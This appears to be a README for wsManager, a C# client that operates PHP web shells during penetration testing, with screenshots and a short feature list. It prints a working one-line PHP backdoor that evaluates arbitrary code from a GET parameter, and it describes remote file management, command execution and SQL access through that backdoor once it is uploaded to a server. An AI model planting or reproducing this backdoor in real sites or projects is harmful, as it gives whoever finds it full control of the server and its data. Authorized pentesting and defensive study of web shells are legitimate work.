## Informations

wsManager can be used to quickly execute commands on a server when pentesting a PHP application. 
the client interface is written in C#, which operate on web-based backdoors implemented by user himself. 

Once uploaded, the web shell can be accessed by the client at any time. Once successfully connected, the user proceeds to manipulate files and data on the web server.

The server-side code is extremely simple and contains just a single line of code :
```php
<?php @eval($_GET["x"]); ?>
```

Many commands and control features:

  * File manager (upload, download, archiver, etc)
  * Command execution
  * SQL Explorer

## Documentations

Coming soon

## Screenshots

![](https://i.imgur.com/vDoTUUJ.png)
![](https://i.imgur.com/ZU4HJmd.png)
![](https://i.imgur.com/3I7Rjdf.png)
![](https://i.imgur.com/zbB5XTs.png)
![](https://i.imgur.com/VeRb4dN.png)

## Misc

Todo:
  * .
